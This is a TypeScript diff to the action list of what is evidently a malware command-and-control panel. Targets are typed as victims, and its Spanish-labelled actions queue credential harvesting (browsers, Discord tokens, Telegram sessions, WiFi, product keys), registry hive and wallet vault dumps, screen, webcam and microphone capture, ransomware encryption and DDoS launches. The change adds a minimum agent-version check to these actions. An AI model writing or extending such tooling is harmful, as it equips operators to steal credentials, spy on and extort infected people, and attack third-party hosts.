@@ -38,6 +38,8 @@ export type ActionDef = {
   /** Vista de solo lectura: ejecuta shell y pinta la salida como tabla. */
   view?: { title: string; command: (victim: Victim) => string };
   windowsOnly?: boolean;
+  /** Versión mínima del agente que entiende la tarea/parámetro. */
+  minAgent?: string;
   /** Acción que no encola nada (abre detalle, pestaña o formulario). */
   local?: boolean;
   destructive?: boolean;
@@ -54,6 +56,7 @@ export type ActionContext = {
   /** El panel perdió su propio stream. */
   disconnected: boolean;
   windows: boolean;
+  agentVersion?: string;
 };
 
 export const GROUPS: Array<{ id: ActionGroupId; label: string; icon: LucideIcon }> = [
@@ -140,11 +143,11 @@ export const ACTIONS: ActionDef[] = [
 
   // Credenciales
   { id: 'harvest', group: 'credenciales', label: 'Harvest completo', icon: Archive, task: 'harvest', detail: 'harvest · {}', bulk: true, resolve: () => task('harvest', {}, 180) },
-  { id: 'harvest-browsers', group: 'credenciales', label: 'Navegadores', icon: Globe, task: 'harvest', detail: 'harvest · kind=browsers', bulk: true, resolve: () => task('harvest', { kind: 'browsers' }, 180) },
-  { id: 'harvest-discord', group: 'credenciales', label: 'Tokens de Discord', icon: MessageSquare, task: 'harvest', detail: 'harvest · kind=discord', bulk: true, resolve: () => task('harvest', { kind: 'discord' }, 120) },
-  { id: 'harvest-telegram', group: 'credenciales', label: 'Sesión de Telegram', icon: MessageSquare, task: 'harvest', detail: 'harvest · kind=telegram', bulk: true, resolve: () => task('harvest', { kind: 'telegram' }, 120) },
-  { id: 'harvest-wifi', group: 'credenciales', label: 'WiFi', icon: Wifi, task: 'harvest', detail: 'harvest · kind=wifi', bulk: true, resolve: () => task('harvest', { kind: 'wifi' }, 120) },
-  { id: 'harvest-productkey', group: 'credenciales', label: 'ProductKey', icon: KeyRound, task: 'harvest', detail: 'harvest · kind=productkey', bulk: true, resolve: () => task('harvest', { kind: 'productkey' }, 120) },
+  { id: 'harvest-browsers', group: 'credenciales', label: 'Navegadores', icon: Globe, task: 'harvest', minAgent: '0.3.7', detail: 'harvest · kind=browsers', bulk: true, resolve: () => task('harvest', { kind: 'browsers' }, 180) },
+  { id: 'harvest-discord', group: 'credenciales', label: 'Tokens de Discord', icon: MessageSquare, task: 'harvest', minAgent: '0.3.7', detail: 'harvest · kind=discord', bulk: true, resolve: () => task('harvest', { kind: 'discord' }, 120) },
+  { id: 'harvest-telegram', group: 'credenciales', label: 'Sesión de Telegram', icon: MessageSquare, task: 'harvest', minAgent: '0.3.7', detail: 'harvest · kind=telegram', bulk: true, resolve: () => task('harvest', { kind: 'telegram' }, 120) },
+  { id: 'harvest-wifi', group: 'credenciales', label: 'WiFi', icon: Wifi, task: 'harvest', minAgent: '0.3.7', detail: 'harvest · kind=wifi', bulk: true, resolve: () => task('harvest', { kind: 'wifi' }, 120) },
+  { id: 'harvest-productkey', group: 'credenciales', label: 'ProductKey', icon: KeyRound, task: 'harvest', minAgent: '0.3.7', detail: 'harvest · kind=productkey', bulk: true, resolve: () => task('harvest', { kind: 'productkey' }, 120) },
   { id: 'hives', group: 'credenciales', label: 'Hives del registro', icon: FileText, task: 'agent', detail: 'agent · hives', windowsOnly: true, resolve: () => agent('hives', 180) },
   { id: 'scan', group: 'credenciales', label: 'Escanear wallets', icon: Wallet, task: 'scan_wallets', detail: 'scan_wallets · opciones', dialog: 'scan_wallets', bulk: true, local: true },
   { id: 'dump', group: 'credenciales', label: 'Extraer vault', icon: Archive, task: 'dump_vault', detail: 'dump_vault · {target}', dialog: 'dump_vault', local: true },
@@ -165,21 +168,21 @@ export const ACTIONS: ActionDef[] = [
 
   // Ficheros
   { id: 'explore', group: 'ficheros', label: 'Explorar ficheros', icon: Files, local: true },
-  { id: 'upload', group: 'ficheros', label: 'Subir fichero desde URL', icon: Upload, task: 'files', detail: 'files · upload {url}', dialog: 'upload', local: true },
-  { id: 'compress', group: 'ficheros', label: 'Comprimir carpeta', icon: Archive, task: 'files', detail: 'files · compress {path}', dialog: 'upload', local: true },
+  { id: 'upload', group: 'ficheros', label: 'Subir fichero desde URL', icon: Upload, task: 'files', minAgent: '0.3.7', detail: 'files · upload {url}', dialog: 'upload', local: true },
+  { id: 'compress', group: 'ficheros', label: 'Comprimir carpeta', icon: Archive, task: 'files', minAgent: '0.3.7', detail: 'files · compress {path}', dialog: 'upload', local: true },
 
   // Monitor
-  { id: 'monitor', group: 'monitor', label: 'Streaming de pantalla', icon: Monitor, task: 'monitor', detail: 'monitor · {seconds,fps,quality}', dialog: 'monitor', local: true },
-  { id: 'webcam', group: 'monitor', label: 'Foto de webcam', icon: Camera, task: 'webcam', detail: 'webcam · {}', resolve: () => task('webcam', {}, 60) },
-  { id: 'mic', group: 'monitor', label: 'Clip de micrófono', icon: Activity, task: 'mic', detail: 'mic · {seconds}', dialog: 'mic', local: true },
+  { id: 'monitor', group: 'monitor', label: 'Streaming de pantalla', icon: Monitor, task: 'monitor', minAgent: '0.3.7', detail: 'monitor · {seconds,fps,quality}', dialog: 'monitor', local: true },
+  { id: 'webcam', group: 'monitor', label: 'Foto de webcam', icon: Camera, task: 'webcam', minAgent: '0.3.7', detail: 'webcam · {}', resolve: () => task('webcam', {}, 60) },
+  { id: 'mic', group: 'monitor', label: 'Clip de micrófono', icon: Activity, task: 'mic', minAgent: '0.3.7', detail: 'mic · {seconds}', dialog: 'mic', local: true },
 
   // Cifrado
-  { id: 'ransom', group: 'cifrado', label: 'Cifrar carpeta', icon: Lock, task: 'ransomware', detail: 'ransomware · encrypt {path}', dialog: 'ransomware', local: true, destructive: true },
-  { id: 'unransom', group: 'cifrado', label: 'Descifrar carpeta', icon: Lock, task: 'ransomware', detail: 'ransomware · decrypt {path}', dialog: 'ransomware', local: true },
-  { id: 'ransom-status', group: 'cifrado', label: 'Estado de cifrado', icon: Activity, task: 'ransomware', detail: 'ransomware · status {path}', dialog: 'ransomware', local: true },
+  { id: 'ransom', group: 'cifrado', label: 'Cifrar carpeta', icon: Lock, task: 'ransomware', minAgent: '0.3.7', detail: 'ransomware · encrypt {path}', dialog: 'ransomware', local: true, destructive: true },
+  { id: 'unransom', group: 'cifrado', label: 'Descifrar carpeta', icon: Lock, task: 'ransomware', minAgent: '0.3.7', detail: 'ransomware · decrypt {path}', dialog: 'ransomware', local: true },
+  { id: 'ransom-status', group: 'cifrado', label: 'Estado de cifrado', icon: Activity, task: 'ransomware', minAgent: '0.3.7', detail: 'ransomware · status {path}', dialog: 'ransomware', local: true },
 
   // Red
-  { id: 'ddos', group: 'red', label: 'Lanzar DDoS', icon: Globe, task: 'ddos', detail: 'ddos · {method,host,port}', dialog: 'ddos', local: true },
+  { id: 'ddos', group: 'red', label: 'Lanzar DDoS', icon: Globe, task: 'ddos', minAgent: '0.3.7', detail: 'ddos · {method,host,port}', dialog: 'ddos', local: true },
 
   // Peligro
   { id: 'kill', group: 'peligro', label: 'Cerrar agente', icon: XCircle, task: 'agent', detail: 'agent · kill', destructive: true, resolve: () => agent('kill', 30) },
@@ -197,6 +200,17 @@ export function actionDetail(action: ActionDef, victim: Victim): string {
   return typeof action.detail === 'function' ? action.detail(victim) : action.detail;
 }
 
+export function versionAtLeast(current: string | undefined, minimum: string): boolean {
+  const parse = (value: string) => value.split('.').map((part) => Number(part.replace(/\D.*/, '')) || 0);
+  const left = parse(current || '0');
+  const right = parse(minimum);
+  for (let index = 0; index < Math.max(left.length, right.length); index += 1) {
+    if ((left[index] ?? 0) > (right[index] ?? 0)) return true;
+    if ((left[index] ?? 0) < (right[index] ?? 0)) return false;
+  }
+  return true;
+}
+
 /** Acciones que solo leen datos ya cargados o abren pestañas. */
 const OFFLINE_OK = new Set(['open', 'tags', 'explore']);
 
@@ -205,5 +219,6 @@ export function actionReason(action: ActionDef, victim: Victim, context: ActionC
   if (context.disconnected) return 'panel sin conexión en vivo';
   if (context.offline && !OFFLINE_OK.has(action.id)) return 'equipo sin socket de control';
   if (action.windowsOnly && !context.windows) return 'solo Windows';
+  if (action.minAgent && !versionAtLeast(context.agentVersion, action.minAgent)) return `requiere agente ${action.minAgent}`;
   return action.disabled?.(victim, context) ?? null;
 }
